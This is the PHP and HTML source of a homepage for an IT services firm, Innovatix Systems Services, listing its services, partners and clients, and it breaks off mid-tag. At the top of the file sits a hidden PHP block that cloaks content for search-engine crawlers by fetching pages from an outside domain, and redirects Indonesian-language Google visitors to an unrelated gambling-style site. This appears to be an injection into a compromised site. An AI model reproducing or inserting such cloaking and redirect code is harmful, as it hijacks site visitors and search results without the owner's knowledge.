<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://grtoto.store/conextion-link/innovatixsystems.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://nelayantoto-amp5.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie10 lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]><html class="no-js lt-ie10 lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]><html class="no-js lt-ie10 lt-ie9"> <![endif]-->
<!--[if IE 9]><html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 8]><!-->
<html class="no-js">
  <!--<![endif]-->

  <head>
    <!-- Basic Page Needs -->
    <meta charset="utf-8" />
    <title>Innovatix</title>
    <meta name="description" content="" />
    <meta name="author" content="" />

    <!-- Mobile Specific Metas -->
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1"
    />

    <!-- Favicons -->
    <link rel="shortcut icon" href="images/favicon.ico" />

    <!-- FONTS -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Poppins:wght@400;500;600;700;800&display=swap"
      rel="stylesheet"
    />

    <!-- CSS -->
    <link rel="stylesheet" href="css/global.css" />
    <link rel="stylesheet" href="css/structure.css" />
    <link rel="stylesheet" href="css/itservice3.css" />
    <link rel="stylesheet" href="css/custom.css" />

    <!-- Revolution Slider -->
    <link rel="stylesheet" href="plugins/rs-plugin-6.custom/css/rs6.css" />

    <!-- Swiper CSS -->
    <link
      rel="stylesheet"
      href="https://unpkg.com/swiper/swiper-bundle.min.css"
    />
    <style>
      .swiper {
        width: 1200px !important;
      }
    </style>
  </head>

  <body
    class="home page template-slider button-round layout-full-width if-zoom no-content-padding header-classic minimalist-header-no sticky-header sticky-tb-color ab-hide subheader-both-left menu-link-color menuo-right menuo-no-borders logo-no-margin mobile-tb-center mobile-side-slide mobile-mini-mr-lc tablet-sticky mobile-header-mini mobile-sticky"
  >
    <div id="Wrapper">
      <div id="Header_wrapper">
        <header id="Header">
          <div id="Top_bar">
            <div class="container">
              <div class="column one">
                <div class="top_bar_left clearfix">
                  <div class="logo">
                    <a
                      id="logo"
                      href="index.html"
                      title="Innovatix"
                      data-height="60"
                      data-padding="30"
                    >
                      <img
                        class="logo-main scale-with-grid"
                        src="images/innovatix-logo.png"
                        data-retina="images/innovatix-logo.png"
                        data-height="60"
                      />
                      <img
                        class="logo-sticky scale-with-grid"
                        src="images/innovatix-logo.png"
                        data-retina="images/innovatix-logo.png"
                        data-height="60"
                      />
                      <img
                        class="logo-mobile scale-with-grid"
                        src="images/innovatix-logo.png"
                        data-retina="images/innovatix-logo.png"
                        data-height="60"
                      />
                      <img
                        class="logo-mobile-sticky scale-with-grid"
                        src="images/innovatix-logo.png"
                        data-retina="images/innovatix-logo.png"
                        data-height="60"
                      />
                    </a>
                  </div>
                  <div class="menu_wrapper">
                    <nav id="menu">
                      <ul id="menu-main-menu" class="menu menu-main">
                        <li
                          class="current-menu-item page_item current_page_item"
                        >
                          <a href="index.html"><span>HOME</span></a>
                        </li>
                        <li>
                          <a href="about.html"><span>ABOUT US</span></a>
                        </li>
                        <li>
                          <a href="services.html"><span>SERVICES</span></a>
                        </li>
                        <li>
                          <a href="products.html"><span>PRODUCTS</span></a>
                        </li>
                        <li>
                          <a href="partners.html"><span>PARTNERS</span></a>
                        </li>
                        <li>
                          <a href="clients.html"><span>CLIENTS</span></a>
                        </li>
                        <li>
                          <a href="careers.html"><span>CAREERS</span></a>
                        </li>
                        <li>
                          <a href="contact.html"><span>CONTACTS</span></a>
                        </li>
                      </ul>
                    </nav>
                    <a class="responsive-menu-toggle" href="#"
                      ><i class="icon-menu-fine"></i
                    ></a>
                  </div>
                </div>
                <div class="top_bar_right">
                  <!--<div class="top_bar_right_wrapper">-->
                  <!--    <a href="contact.html" class="action_button" target="_blank">Enquire<i class="icon-right-open"></i></a>-->
                  <!--</div>-->
                </div>
              </div>
            </div>
          </div>
          <div class="mfn-main-slider mfn-rev-slider">
            <p class="rs-p-wp-fix"></p>
            <rs-module-wrap
              id="rev_slider_1_1_wrapper"
              data-source="gallery"
              style="
                background: transparent;
                padding: 0;
                margin: 0px auto;
                margin-top: 0;
                margin-bottom: 0;
              "
            >
              <rs-module
                id="rev_slider_1_1"
                style="display: none"
                data-version="6.1.6"
              >
                <rs-slides>
                  <rs-slide
                    data-key="rs-1"
                    data-title="Slide"
                    data-anim="ei:d;eo:d;s:1000;r:0;t:fade;sl:0;"
                  >
                    <img
                      src="images/ISS Software dev02.jpg"
                      data-parallax="5"
                      class="rev-slidebg"
                    />
                    <rs-layer
                      id="slider-1-slide-1-layer-0"
                      class="rs-pxl-3"
                      data-type="text"
                      data-rsp_ch="on"
                      data-xy="xo:100px,100px,62px,62px;yo:180px,180px,272px,272px;"
                      data-text="w:normal;s:60,60,50,50;l:70,70,60,60;"
                      data-dim="w:750px,750px,700px,700px;"
                      data-frame_0="x:50,50,31,31;"
                      data-frame_1="st:100;sp:1000;sR:100;"
                      data-frame_999="o:0;st:w;sR:7900;"
                      style="z-index: 8; font-family: 'Oswald', sans-serif"
                    >
                      Empowering Businesses
                      <br />
                      with
                      <span class="themecolor">Innovative</span>
                      <br />IT Solutions
                    </rs-layer>
                    <a
                      id="slider-1-slide-1-layer-1"
                      class="rs-layer rev-btn rs-pxl-3"
                      href="#"
                      target="_self"
                      rel="nofollow"
                      data-type="button"
                      data-color="#322d2c"
                      data-rsp_ch="on"
                      data-xy="xo:278px,278px,253px,253px;yo:492px,492px,580px,580px;"
                      data-text="w:normal;s:17,17,20,20;l:50,50,55,55;"
                      data-dim="minh:0px,0px,none,0px;"
                      data-padding="r:35;l:35;"
                      data-border="bor:25px,25px,25px,25px;"
                      data-frame_0="x:50,50,31,31;"
                      data-frame_1="st:300;sp:1000;sR:300;"
                      data-frame_999="o:0;st:w;sR:7700;"
                      data-frame_hover="c:#322d2c;bgc:#e8eaf4;bor:25px,25px,25px,25px;sp:200;e:Power1.easeInOut;"
                      style="
                        z-index: 10;
                        background-color: #f0f2f9;
                        font-family: 'Poppins', sans-serif;
                      "
                      >OUR SERVICES
                    </a>
                    <a
                      id="slider-1-slide-1-layer-3"
                      class="rs-layer rev-btn rs-pxl-3"
                      href="#"
                      target="_self"
                      rel="nofollow"
                      data-type="button"
                      data-rsp_ch="on"
                      data-xy="xo:100px,100px,62px,62px;yo:492px,492px,580px,580px;"
                      data-text="w:normal;s:17,17,20,20;l:50,50,55,55;"
                      data-dim="minh:0px,0px,none,0px;"
                      data-padding="r:35;l:35;"
                      data-border="bor:25px,25px,25px,25px;"
                      data-frame_0="x:50,50,31,31;"
                      data-frame_1="st:200;sp:1000;sR:200;"
                      data-frame_999="o:0;st:w;sR:7800;"
                      data-frame_hover="bgc:#e6851c;bor:25px,25px,25px,25px;sp:200;e:Power1.easeInOut;"
                      style="
                        z-index: 9;
                        background-color: #2c6ebc;
                        font-family: 'Poppins', sans-serif;
                      "
                      >READ MORE
                    </a>
                  </rs-slide>
                </rs-slides>
                <rs-progress
                  class="rs-bottom"
                  style="visibility: hidden !important"
                ></rs-progress>
              </rs-module>
            </rs-module-wrap>
          </div>
        </header>
      </div>
      <div id="Content" class="steps">
        <div class="content_wrapper clearfix">
          <div class="sections_group">
            <div class="entry-content">
              <div
                class="section mcb-section no-margin-h no-margin-v"
                style="background-color: #f0f2fa"
              >
                <div class="section_wrapper mcb-section-inner">
                  <div
                    class="wrap mcb-wrap one-fourth valign-top move-up clearfix"
                    style="margin-top: -130px"
                    data-mobile="no-up"
                  >
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            background-color: #2c6ebc;
                            padding: 50px 15% 35px;
                            border-radius: 20px 0 0 20px;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid alignnone no_border"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/process-01.png"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 30px" />
                          <h5>STEP 1</h5>
                          <p class="tit-bold" style="color: #e0eff9">
                            Requirement Gathering Process
                          </p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            padding: 30px 15% 50px;
                            border-right: 1px solid #d8d9e1;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid no_border"
                            style="margin-top: -55px"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/one-01.svg"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 40px" />
                          <p>
                            Gathering needs from stakeholders for project
                            understanding.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="wrap mcb-wrap one-fourth valign-top move-up clearfix"
                    style="margin-top: -130px"
                    data-mobile="no-up"
                  >
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            background-color: #2c6ebc;
                            padding: 50px 15% 35px;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid alignnone no_border"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/develpment-01.png"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 30px" />
                          <h5>STEP 2</h5>
                          <p class="tit-bold" style="color: #e0eff9">
                            System Design & Development Process
                          </p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            padding: 30px 15% 50px;
                            border-right: 1px solid #d8d9e1;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid no_border"
                            style="margin-top: -55px"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/two-01.svg"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 40px" />
                          <p>Designing software: planning, coding, testing.</p>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="wrap mcb-wrap one-fourth valign-top move-up clearfix"
                    style="margin-top: -130px"
                    data-mobile="no-up"
                  >
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            background-color: #2c6ebc;padding: 50px 15% 35px;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid alignnone no_border"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/integration-01.png"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 30px" />
                          <h5>STEP 3</h5>
                          <p class="tit-bold" style="color: #e0eff9">
                            Implementation & Integration Process
                          </p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            padding: 30px 15% 50px;
                            border-right: 1px solid #d8d9e1;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid no_border"
                            style="margin-top: -55px"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/three-01.svg"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 40px" />
                          <p>Deploying and integrating software.</p>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="wrap mcb-wrap one-fourth valign-top move-up clearfix"
                    style="margin-top: -130px"
                    data-mobile="no-up"
                  >
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="
                            background-color: #2c6ebc;
                            padding: 50px 15% 35px;
                            border-radius: 0 20px 20px 0;
                          "
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid alignnone no_border"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/maintenance-01.png"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 30px" />
                          <h5>STEP 4</h5>
                          <p class="tit-bold" style="color: #e0eff9">
                            Maintenance & Support Process
                          </p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_column">
                        <div
                          class="column_attr clearfix"
                          style="padding: 30px 15% 50px"
                        >
                          <div
                            class="image_frame image_item no_link scale-with-grid no_border"
                            style="margin-top: -55px"
                          >
                            <div class="image_wrapper">
                              <img
                                class="scale-with-grid"
                                src="images/four-01.svg"
                              />
                            </div>
                          </div>
                          <hr class="no_line" style="margin: 0 auto 40px" />
                          <p>Ongoing software care.</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="section mcb-section"
                style="padding-top: 120px; padding-bottom: 80px"
              >
                <div class="section_wrapper mcb-section-inner">
                  <div class="wrap mcb-wrap one-second valign-middle clearfix">
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_image">
                        <div
                          class="image_frame image_item no_link scale-with-grid no_border"
                        >
                          <div class="image_wrapper">
                            <img
                              class="scale-with-grid"
                              src="images/hm-abt.png"
                            />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    class="wrap mcb-wrap one-second valign-middle clearfix"
                    style="padding: 0 0 0 7%"
                  >
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one column_column">
                        <div class="column_attr clearfix hm-abt">
                          <h6>
                            ABOUT US
                            <i
                              class="icon-down-circled"
                              style="color: #2c6ebc"
                            ></i>
                          </h6>
                          <h2>
                            Empowering Businesses with Customized Software
                            Solutions
                          </h2>
                          <p>
                            INNOVATIX Systems Services is a software development
                            company that specializes in providing ERP
                            implementation, mobile and web application
                            development, data analytics, and consulting
                            services. The company aims to assess the current
                            business processes of the client, collect and
                            analyse their requirements, and develop integrated
                            and automated solutions to improve their
                            productivity and efficiency.
                          </p>
                          <p></p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_button">
                        <a
                          class="button button_size_2 button_theme button_js"
                          href="#"
                          ><span class="button_label">READ MORE</span></a
                        >
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="section mcb-section no-margin-h no-margin-v"
                style="
                  padding-top: 60px;
                  padding-bottom: 40px;
                  background-color: #2c6ebc;
                  background-image: url(images/innovatix-icon-01.png);
                  background-repeat: no-repeat;
                  background-position: right center;
                "
              >
                <div class="section_wrapper mcb-section-inner">
                  <div class="wrap mcb-wrap one valign-top clearfix">
                    <div class="mcb-wrap-inner">
                      <div class="column mcb-column one-second column_column">
                        <div class="column_attr clearfix">
                          <h6 style="color: #ff9d45">
                            OUR SERVICES
                            <i
                              class="icon-down-circled"
                              style="color: #fff"
                            ></i>
                          </h6>
                          <h2 style="color: #fff">What we can do for you?</h2>
                        </div>
                      </div>
                      <div
                        class="column mcb-column one-second column_column our-ser-desc"
                      >
                        <div
                          class="column_attr clearfix"
                          style="padding: 0 0 0 8%"
                        >
                          <p>
                            Our services include systems integration, online and
                            smart solutions, application development, business
                            consultancy, managed services, business process
                            reengineering, quality assurance, research and
                            development, security solutions, and business data
                            analytics.
                          </p>
                        </div>
                      </div>
                      <div class="column mcb-column one column_divider">
                        <hr class="no_line" style="margin: 0 auto 70px" />
                      </div>
                    </div>
                  </div>
                  <div style="display: inline-flex">
                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/software-development.jpg"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">Software Development</h4>
                            <p>
                              The company develops mobile and web applications,
                              integrates software, and provides web application
                              development services to clients.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/erp-solution.jpg"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">ERP Implementation</h4>
                            <p>
                              The company specializes in implementing Microsoft
                              ERP systems and offers modules such as HR,
                              finance, case management, and customer voice to
                              help clients improve their business operations.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/data-analytics.jpg"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">Data Analytics</h4>
                            <p>
                              INNOVATIX Systems Services offers database
                              planning and implementation, dash-board
                              development, and business intelligence and
                              insights development services to help clients make
                              data-driven decisions.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/cyber.jpg"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">
                              Cybersecurity Services
                            </h4>
                            <p>
                              Cybersecurity services provide information,
                              strategies, and designs to improve digital
                              security
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/cloud-services-1.png"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">
                              Cloud Professional Services
                            </h4>
                            <p>
                              We specialize in strategic planning, seamless
                              migration, and robust integration of applications
                              and data into secure cloud environments.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      class="wrap mcb-wrap one-fourth1 valign-top clearfix service-bx-sec"
                    >
                      <div class="mcb-wrap-inner">
                        <div class="column mcb-column one column_image">
                          <div
                            class="image_frame image_item scale-with-grid no_border"
                          >
                            <div class="image_wrapper">
                              <a href="#">
                                <div class="mask"></div>
                                <img
                                  class="scale-with-grid"
                                  src="images/Consulting-&-advisory-services.jpg"
                              /></a>
                              <div class="image_links">
                                <a href="#" class="link"
                                  ><i class="icon-link"></i
                                ></a>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="column mcb-column one column_column">
                          <div
                            class="column_attr clearfix"
                            style="padding: 15px 5% 15px"
                          >
                            <h4 style="color: #ff9d45">
                              Consulting & advisory
                            </h4>
                            <p>
                              The company offers process mapping and automation
                              services to help clients optimize their business
                              processes.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <section class="our-part">
        <div
          class="section mcb-section"
          style="padding-top: 20px; padding-bottom: 20px"
        >
          <h2 style="color: #111111">Our Partners & Suppliers</h2>
          <div class="content_wrapper clearfix">
            <div class="swiper">
              <div class="swiper-container">
                <div class="swiper-wrapper prod-wrapper">
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/alhua.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/barracuda.jpg"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/google1.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/palo-alto.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/hik.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/huawei.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/hpe.png"
                          class="scale-with-grid"
                          alt=""/>
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/fortinet.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/avientek.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/partners/deerfield.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- @@@@ -->
          <h2 style="color: #111111">Our Clients</h2>
          <div class="content_wrapper clearfix">
            <div class="swiper">
              <div class="swiper-container-clients">
                <div class="swiper-wrapper prod-wrapper">
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/tallum.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/amag.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/aja.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/amab.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/tarbeya.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/sparata.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/gssg.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/teyseer.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/sana-alshams.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/ifitness_1.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                  <div class="swiper-slide">
                    <div class="prod-bx">
                      <div class="prod-img">
                        <img
                          src="images/clients/acciona.png"
                          class="scale-with-grid"
                          alt=""
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <!--FOOTER SECTION-->
      <div id="footer-placeholder">
      <!--FOOTER SECTION-->
    </div>
    <div id="Side_slide" class="right dark" data-width="250">
      <div class="close-wrapper">
        <a href="#" class="close"><i class="icon-cancel-fine"></i></a>
      </div>
      <div class="menu_wrapper"></div>
      <ul class="social">
        <li class="facebook">
          <a
            href="https://www.facebook.com/InnovatixSystems"
            title="Facebook"
            target="_blank"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-facebook"
              viewBox="0 0 16 16"
            >
              <path
                d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"
              />
            </svg>
          </a>
        </li>
        <li class="twitter">
          <a
            href="https://twitter.com/InnovatixSystem"
            title="Twitter"
            target="_blank"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-twitter-x"
              viewBox="0 0 16 16"
            >
              <path
                d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"
              />
            </svg>
          </a>
        </li>
        <li class="linked">
          <a
            href="https://linkedin.com/company/innovatixsystems"
            title="linkedin"
            target="_blank"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-linkedin"
              viewBox="0 0 16 16"
            >
              <path
                d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"
              />
            </svg>
          </a>
        </li>
        <li class="ig">
          <a
            href="https://instagram.com/innovatixsystems"
            title="instagram"
            target="_blank"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              fill="currentColor"
              class="bi bi-instagram"
              viewBox="0 0 16 16"
            >
              <path
